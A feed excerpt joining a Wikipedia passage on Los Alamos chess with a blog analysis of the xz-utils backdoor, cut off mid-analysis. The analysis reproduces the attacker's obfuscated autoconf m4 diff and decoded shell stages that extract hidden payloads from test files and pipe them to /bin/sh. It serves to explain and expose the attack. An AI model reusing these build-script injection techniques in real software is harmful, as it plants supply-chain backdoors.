<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg/220px-Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg" decoding="async" width="220" height="196" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg/330px-Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg/440px-Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg 2x" data-file-width="1000" data-file-height="889"></a><figcaption>Paul Stein and <a href="https://en.wikipedia.org/wiki/Nicholas_Metropolis" title="Nicholas Metropolis">Nicholas Metropolis</a> play Los Alamos chess against the MANIAC.</figcaption></figure>
<p>The starting position is illustrated. All rules are as in <a href="https://en.wikipedia.org/wiki/Rules_of_chess" title="Rules of chess">chess</a> except:
</p>
<ul><li>There is no <a href="https://en.wikipedia.org/wiki/Pawn_(chess)" title="Pawn (chess)">pawn</a> double-step move, nor is there the <i><a href="https://en.wikipedia.org/wiki/En_passant" title="En passant">en passant</a></i> capture;</li>
<li><a href="https://en.wikipedia.org/wiki/Pawn_(chess)" title="Pawn (chess)">Pawns</a> may not be promoted to bishops;</li>
<li>There is no <a href="https://en.wikipedia.org/wiki/Castling" title="Castling">castling</a>.</li></ul>
<h2><span id="Los_Alamos_trials">Los Alamos trials</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=2" title="Edit section: Los Alamos trials"><span>edit</span></a><span>]</span></span></h2>

<p>The computer played three games. The first was played against itself. The second one was against a strong human player, who played <a href="https://en.wikipedia.org/wiki/Chess_handicap" title="Chess handicap">without a queen</a>. The human player won. In the third game, MANIAC I played against a laboratory assistant who had been taught the <a href="https://en.wikipedia.org/wiki/Rules_of_chess" title="Rules of chess">rules of chess</a> in the preceding week specifically for the game. The computer won, marking the first time that a computer had beaten a human player in a chess-like game.<sup id="cite_ref-Pritchard94_2-1"><a href="#cite_note-Pritchard94-2">[2]</a></sup><sup id="cite_ref-Pritchard07_4-0"><a href="#cite_note-Pritchard07-4">[4]</a></sup>
</p>
<h3><span id="The_second_game">The second game</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=3" title="Edit section: The second game"><span>edit</span></a><span>]</span></span></h3>

<p>White: <a href="https://en.wikipedia.org/wiki/Martin_Kruskal" title="Martin Kruskal">Martin Kruskal</a> <span>&nbsp;</span> Black: <a href="https://en.wikipedia.org/wiki/MANIAC_I" title="MANIAC I">MANIAC I</a><br>1. d3 Na4 2. b3 Nb6 3. c3 d4 4. c4 bxc4 5. dxc4 a4 6. Na3 e4 7. Kd2 Ke5 8. f3 e3+ 9. Kc2 axb3+ 10. axb3 Nf4 11. Nd3+ Nxd3 12. Kxd3 Kf4 13. Kc2 Ra5 14. Kb2 Re6 15. Rfd1 Re5 16. Nc2 Rxa1 17. Kxa1 Re6 18. Kb2 Re5 19. Ne1 Qe4 20. fxe4 fxe4 21. Kc2 d3+ 22. exd3 e2 23. Ra1 Re6 24. Ra5 exd3+ 25. Kd2 Re4 26. Rxc5 Re6 27. Nxd3+ Ke4 28. Kxe2 Kd4+ 29. Re5 Rxe5+ 30. Nxe5 Kc5 31. Kd3 Kb4 32. Kd4 Nxc4 33. bxc4 Kb3 34. c5 Kb4 35. c6=Q Kb3 36. Nd3 Ka2 37. Qc3 Kb1 38. Qb2<a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)##" title="Algebraic notation (chess)">#</a> <a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)#1%E2%80%930" title="Algebraic notation (chess)">1–0</a><sup id="cite_ref-5"><a href="#cite_note-5">[5]</a></sup>
</p>
<h3><span id="The_third_game">The third game</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=4" title="Edit section: The third game"><span>edit</span></a><span>]</span></span></h3>

<p>White: <a href="https://en.wikipedia.org/wiki/MANIAC_I" title="MANIAC I">MANIAC I</a> <span>&nbsp;</span> Black: Beginner <br>1.d3 b4 2.Nf3 d4 3.b3 e4 4.Ne1 a4 5.bxa4 Nxa4 6.Kd2 Nc3 7.Nxc3 bxc3+ 8.Kd1 f4 9.a3 Rb6 10.a4 Ra6 11.a5 Kd5 12.Qa3 Qb5 13.Qa2+ Ke5 14.Rb1 Rxa5 15.Rxb5 Rxa2 16.Rb1 Ra5 17.f3 Ra4 18.fxe4 c4 19.Nf3+ Kd6 20.e5+ Kd5 21.exf6=Q Nc5 22.Qxd4+ Kc6 23.Ne5<a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)##" title="Algebraic notation (chess)">#</a> <a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)#1%E2%80%930" title="Algebraic notation (chess)">1–0</a><sup id="cite_ref-Pritchard94_2-2"><a href="#cite_note-Pritchard94-2">[2]</a></sup>
</p>
<h2><span id="References">References</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=5" title="Edit section: References"><span>edit</span></a><span>]</span></span></h2>
<div>
<ol>
<li id="cite_note-Anderson-1"><span><b><a href="#cite_ref-Anderson_1-0">^</a></b></span> <span><cite id="CITEREFAnderson1986"><a href="https://en.wikipedia.org/wiki/Herbert_L._Anderson" title="Herbert L. Anderson">Anderson, Herbert L.</a> (Fall 1986). <a rel="nofollow" href="http://www.fas.org/sgp/othergov/doe/lanl/pubs/00326886.pdf">"Metropolis, Monte Carlo, and the MANIAC"</a> <span>(PDF)</span>. <i><a href="https://en.wikipedia.org/wiki/Los_Alamos_Science" title="Los Alamos Science">Los Alamos Science</a></i>: 104–105.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Los+Alamos+Science&amp;rft.atitle=Metropolis%2C+Monte+Carlo%2C+and+the+MANIAC&amp;rft.ssn=fall&amp;rft.pages=104-105&amp;rft.date=1986&amp;rft.aulast=Anderson&amp;rft.aufirst=Herbert+L.&amp;rft_id=http%3A%2F%2Fwww.fas.org%2Fsgp%2Fothergov%2Fdoe%2Flanl%2Fpubs%2F00326886.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
<li id="cite_note-Pritchard94-2"><span>^ <a href="#cite_ref-Pritchard94_2-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-Pritchard94_2-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-Pritchard94_2-2"><sup><i><b>c</b></i></sup></a></span> <span><cite id="CITEREFPritchard1994"><a href="https://en.wikipedia.org/wiki/David_Pritchard_(chess_player)" title="David Pritchard (chess player)">Pritchard, D. B.</a> (1994). "Los Alamos Chess". <i>The Encyclopedia of Chess Variants</i>. Games &amp; Puzzles Publications. pp.&nbsp;175–76. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)" title="ISBN (identifier)">ISBN</a>&nbsp;<a href="https://en.wikipedia.org/wiki/Special:BookSources/0-9524142-0-1" title="Special:BookSources/0-9524142-0-1"><bdi>0-9524142-0-1</bdi></a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Los+Alamos+Chess&amp;rft.btitle=The+Encyclopedia+of+Chess+Variants&amp;rft.pages=175-76&amp;rft.pub=Games+%26+Puzzles+Publications&amp;rft.date=1994&amp;rft.isbn=0-9524142-0-1&amp;rft.aulast=Pritchard&amp;rft.aufirst=D.+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
<li id="cite_note-:0-3"><span>^ <a href="#cite_ref-:0_3-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-:0_3-1"><sup><i><b>b</b></i></sup></a></span> <span><cite id="CITEREFNewellSimon2019">Newell, Allen; Simon, Herbert Alexander (2019). <i>Human problem solving</i>. Brattleboro, Vermont: Echo Point Books &amp; Media. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)" title="ISBN (identifier)">ISBN</a>&nbsp;<a href="https://en.wikipedia.org/wiki/Special:BookSources/978-1-63561-792-4" title="Special:BookSources/978-1-63561-792-4"><bdi>978-1-63561-792-4</bdi></a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Human+problem+solving&amp;rft.place=Brattleboro%2C+Vermont&amp;rft.pub=Echo+Point+Books+%26+Media&amp;rft.date=2019&amp;rft.isbn=978-1-63561-792-4&amp;rft.aulast=Newell&amp;rft.aufirst=Allen&amp;rft.au=Simon%2C+Herbert+Alexander&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
<li id="cite_note-Pritchard07-4"><span><b><a href="#cite_ref-Pritchard07_4-0">^</a></b></span> <span><cite id="CITEREFPritchard2007"><a href="https://en.wikipedia.org/wiki/David_Pritchard_(chess_player)" title="David Pritchard (chess player)">Pritchard, D. B.</a> (2007). "Los Alamos Chess". In Beasley, John (ed.). <i>The Classified Encyclopedia of Chess Variants</i>. John Beasley. p.&nbsp;112. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)" title="ISBN (identifier)">ISBN</a>&nbsp;<a href="https://en.wikipedia.org/wiki/Special:BookSources/978-0-9555168-0-1" title="Special:BookSources/978-0-9555168-0-1"><bdi>978-0-9555168-0-1</bdi></a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Los+Alamos+Chess&amp;rft.btitle=The+Classified+Encyclopedia+of+Chess+Variants&amp;rft.pages=112&amp;rft.pub=John+Beasley&amp;rft.date=2007&amp;rft.isbn=978-0-9555168-0-1&amp;rft.aulast=Pritchard&amp;rft.aufirst=D.+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
<li id="cite_note-5"><span><b><a href="#cite_ref-5">^</a></b></span> <span><cite id="CITEREFSteinUlam1957">Stein, P.; Ulam, S. (January 1957). <a rel="nofollow" href="https://uscf1-nyc1.aodhosting.com/CL-AND-CR-ALL/CR-ALL/CR1957/CR1957_01.pdf">"Experiments in Chess on Electronic Computing Machines"</a> <span>(PDF)</span>. <i><a href="https://en.wikipedia.org/wiki/Chess_Review" title="Chess Review">Chess Review</a></i>: 13–17.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Chess+Review&amp;rft.atitle=Experiments+in+Chess+on+Electronic+Computing+Machines&amp;rft.pages=13-17&amp;rft.date=1957-01&amp;rft.aulast=Stein&amp;rft.aufirst=P.&amp;rft.au=Ulam%2C+S.&amp;rft_id=https%3A%2F%2Fuscf1-nyc1.aodhosting.com%2FCL-AND-CR-ALL%2FCR-ALL%2FCR1957%2FCR1957_01.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
</ol></div>
<h2><span id="External_links">External links</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=6" title="Edit section: External links"><span>edit</span></a><span>]</span></span></h2>
<ul><li><a rel="nofollow" href="https://www.chessvariants.org/small.dir/losalamos.html">Los Alamos Chess</a> by <a href="https://en.wikipedia.org/wiki/Hans_L._Bodlaender" title="Hans L. Bodlaender">Hans L. Bodlaender</a>, <i><a href="https://en.wikipedia.org/wiki/The_Chess_Variant_Pages" title="The Chess Variant Pages">The Chess Variant Pages</a></i></li>
<li><a rel="nofollow" href="https://www.chessvariants.com/large.dir/contest84/losalamos4.html">Los Alamos Vierschach</a> by <a rel="nofollow" href="https://www.chessvariants.com/who/JorgKnappen">Jörg Knappen</a>, <i>The Chess Variant Pages</i></li>
<li><a rel="nofollow" href="https://archive.today/20120730113449/http://www.chessbase.com/columns/column.asp?pid=102">A short history of computer chess</a> by Frederic Friedel</li>
<li><a rel="nofollow" href="http://brainking.com/">BrainKing.com</a> - internet server to play Los Alamos chess.</li></ul>

<!-- 
NewPP limit report
Parsed by mw1492
Cached time: 20240402194351
Cache expiry: 2592000
Reduced expiry: false
Complications: [vary‐revision‐sha1, show‐toc]
CPU time usage: 0.376 seconds
Real time usage: 0.496 seconds
Preprocessor visited node count: 1182/1000000
Post‐expand include size: 96242/2097152 bytes
Template argument size: 716/2097152 bytes
Highest expansion depth: 8/100
Expensive parser function count: 1/500
Unstrip recursion depth: 1/20
Unstrip post‐expand size: 28368/5000000 bytes
Lua time usage: 0.191/10.000 seconds
Lua memory usage: 4420474/52428800 bytes
Number of Wikibase entities loaded: 0/400
-->
<!--
Transclusion expansion time report (%,ms,calls,template)
100.00%  337.156      1 -total
 37.64%  126.900      1 Template:Reflist
 28.59%   96.387      5 Template:Navbox
 27.64%   93.203      1 Template:Chess_variants
 27.25%   91.888      2 Template:Cite_journal
 21.88%   73.777      1 Template:Short_description
 13.90%   46.854      2 Template:Pagetype
  6.35%   21.415      1 Template:AN_chess
  5.22%   17.602      1 Template:Side_box
  5.05%   17.011      3 Template:Cite_book
-->

<!-- Saved in parser cache with key enwiki:pcache:idhash:3308490-0!canonical and timestamp 20240402194351 and revision id 1216925127. Rendering was triggered because: api-parse
 -->
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The xz attack shell script (335 pts)]]></title>
            <link>https://research.swtch.com/xz-script</link>
            <guid>39903685</guid>
            <pubDate>Tue, 02 Apr 2024 09:05:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.swtch.com/xz-script">https://research.swtch.com/xz-script</a>, See on <a href="https://news.ycombinator.com/item?id=39903685">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2>The xz attack shell script
        
        <div>
        <p>
          
            Posted on Tuesday, April 2, 2024.
            
          
        </p>
        </div>
        </h2>
        <a href="#introduction"><h2 id="introduction">Introduction</h2></a>


<p>
Andres Freund <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">published the existence of the xz attack</a> on 2024-03-29 to the public oss-security@openwall mailing list. The day before, he alerted Debian security and the (private) distros@openwall list. In his mail, he says that he dug into this after “observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors).”

</p><p>
At a high level, the attack is split in two pieces: a shell script and an object file. There is an injection of shell code during <code>configure</code>, which injects the shell code into <code>make</code>. The shell code during <code>make</code> adds the object file to the build. This post examines the shell script. (See also <a href="https://research.swtch.com/xz-timeline">my timeline post</a>.)

</p><p>
The nefarious object file would have looked suspicious checked into the repository as <code>evil.o</code>, so instead both the nefarious shell code and object file are embedded, compressed and encrypted, in some binary files that were added as “test inputs” for some new tests. The test file directory already existed from long before Jia Tan arrived, and the README explained “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better "source code" than the files themselves.” This is a fact of life for parsing libraries like liblzma. The attacker looked like they were just <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">adding a few new test files</a>.

</p><p>
Unfortunately the nefarious object file turned out to have a bug that caused problems with Valgrind, so the test files needed to be updated to add the fix. <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1">That commit</a> explained “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.” The attackers realized at this point that they needed a better update mechanism, so the new nefarious script contains an extension mechanism that lets it look for updated scripts in new test files, which wouldn’t draw as much attention as rewriting existing ones.

</p><p>
The effect of the scripts is to arrange for the nefarious object file’s <code>_get_cpuid</code> function to be called as part of a <a href="https://sourceware.org/glibc/wiki/GNU_IFUNC">GNU indirect function</a> (ifunc) resolver. In general these resolvers can be called lazily at any time during program execution, but for security reasons it has become popular to call all of them during dynamic linking (very early in program startup) and then map the <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">global offset table (GOT) and procedure linkage table (PLT) read-only</a>, to keep buffer overflows and the like from being able to edit it. But a nefarious ifunc resolver would run early enough to be able to edit those tables, and that’s exactly what the backdoor introduced. The resolver then looked through the tables for <code>RSA_public_decrypt</code> and replaced it with a nefarious version that <a href="https://github.com/amlweems/xzbot">runs attacker code when the right SSH certificate is presented</a>.
<a href="#configure"></a></p><h2 id="configure"><a href="#configure">Configure</a></h2>


<p>
Again, this post looks at the script side of the attack. Like most complex Unix software, xz-utils uses GNU autoconf to decide how to build itself on a particular system. In ordinary operation, autoconf reads a <code>configure.ac</code> file and produces a <code>configure</code> script, perhaps with supporting m4 files brought in to provide “libraries” to the script. Usually, the <code>configure</code> script and its support libraries are only added to the tarball distributions, not the source repository. The xz distribution works this way too.

</p><p>
The attack kicks off with the attacker adding an unexpected support library, <code>m4/build-to-host.m4</code> to the xz-5.6.0 and xz-5.6.1 tarball distributions. Compared to the standard <code>build-to-host.m4</code>, the attacker has made the following changes:
</p><pre>diff --git a/build-to-host.m4 b/build-to-host.m4
index ad22a0a..d5ec315 100644
--- a/build-to-host.m4
+++ b/build-to-host.m4
@@ -1,5 +1,5 @@
-# build-to-host.m4 serial 3
-dnl Copyright (C) 2023 Free Software Foundation, Inc.
+# build-to-host.m4 serial 30
+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
 dnl with or without modifications, as long as this notice is preserved.
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],


   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'
+  else
+    gl_[$1]_config=&amp;rdquo;
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])


 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&amp;'();&lt;&gt;\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl
</pre>


<p>
All in all, this is a fairly plausible set of diffs, in case anyone thought to check. It bumps the version number, updates the copyright year to look current, and makes a handful of inscrutable changes that don’t look terribly out of place.

</p><p>
Looking closer, the something is amiss. Starting near the bottom,
</p><pre>gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`
if test -n "$gl_am_configmake"; then
  HAVE_PKG_CONFIGMAKE=1
else
  HAVE_PKG_CONFIGMAKE=0
fi
</pre>


<p>
Let’s see which files in the distribution match the pattern (simplifying the <code>grep</code> command): 
</p><pre>% egrep -Rn '####[[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]]####$'
Binary file ./tests/files/bad-3-corrupt_lzma2.xz matches
%
</pre>


<p>
That’s surprising! So this script sets <code>gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz</code> and <code>HAVE_PKG_CONFIGMAKE=1</code>. The <code>gl_path_map</code> setting is a <a href="https://linux.die.net/man/1/tr">tr(1)</a> command that swaps tabs and spaces and swaps underscores and dashes.

</p><p>
Now reading the top of the script,
</p><pre>gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
</pre>


<p>
extracts the final dot-separated element of that filename, leaving <code>xz</code>. That is, it’s the file name suffix, not a prefix, and it is the name of the compression command that is likely already installed on any build machine.

</p><p>
The next section is:
</p><pre>if test "x$gl_am_configmake" != "x"; then
  gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'
else
  gl_[$1]_config=&amp;rdquo;
fi
</pre>


<p>
We know that <code>gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz</code>, so this sets the <code>gl_[$1]_config</code> variable to the string
</p><pre>sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null
</pre>


<p>
At first glance, especially in the original quoted form, the <code>sed</code> command looks like it has something to do with line endings, but in fact <code>r\n</code> is the <code>sed</code> “read from file <code>\n</code>” command. Since the file <code>\n</code> does not exist, the command does nothing at all, and then since <code>sed</code> has not been invoked with the <code>-n</code> option, <code>sed</code> prints each line of input. So <code>sed "r\n"</code> is just an obfuscated <code>cat</code> command, and remember that <code>$gl_path_map</code> is the <code>tr</code> command from before, and <code>$gl_[$1]_prefix</code> is <code>xz</code>. To the shell, this command is really
</p><pre>cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
</pre>


<p>
But right now it’s still just a string; it hasn’t been run. That changes with
</p><pre>dnl If the host conversion code has been placed in $gl_config_gt,
dnl instead of duplicating it all over again into config.status,
dnl then we will have config.status run $gl_config_gt later, so it
dnl needs to know what name is stored there:
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
</pre>


<p>
The final <code>"eval \$gl_[$1]_config"</code> runs that command. If we run it on the xz 5.6.0 repo, we get:
</p><pre>$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31265|
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$
</pre>


<p>
I have inserted some line breaks, here and in later script fragments,
to keep the lines from being too long in the web page.

</p><p>
Why the Hello and World? The README text that came with the test file describes it:</p><blockquote>

<p>
bad-3-corrupt_lzma2.xz has three Streams in it. The first and third streams are valid xz Streams. The middle Stream has a correct Stream Header, Block Header, Index and Stream Footer. Only the LZMA2 data is corrupt. This file should decompress if <code>--single-stream</code> is used.</p></blockquote>

<p>
The first and third streams are the Hello and World, and the middle stream has been corrupted by swapping the byte values unswapped by the <code>tr</code> command.

</p><p>
Recalling that xz 5.6.1 shipped with different “test” files, we can also try xz 5.6.1:
</p><pre>$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#�U��$�
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31233|
    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$
</pre>


<p>
The first difference is that the script makes sure (very sure!) to exit if not being run on Linux. The second difference is that the long “<code>export i</code>” line deviates in the final head command offset (724 vs 939) and then the tail offset and the <code>tr</code> argument. Let’s break those down.

</p><p>
The <code>head</code> command prints a prefix of its input. Let’s look at the start:
</p><pre>(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; ...
</pre>


<p>
This discards the first kilobyte of standard input, prints the next two kilobytes, discards the next kilobyte, and prints the next two kilobytes. And so on. The whole command for 5.6.1 is:
</p><pre>(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
... 16 times total ...
head -c +939
</pre>


<p>
The shell variable <code>i</code> is set to this long command. Then the script runs:
</p><pre>xz -dc $srcdir/tests/files/good-large_compressed.lzma |
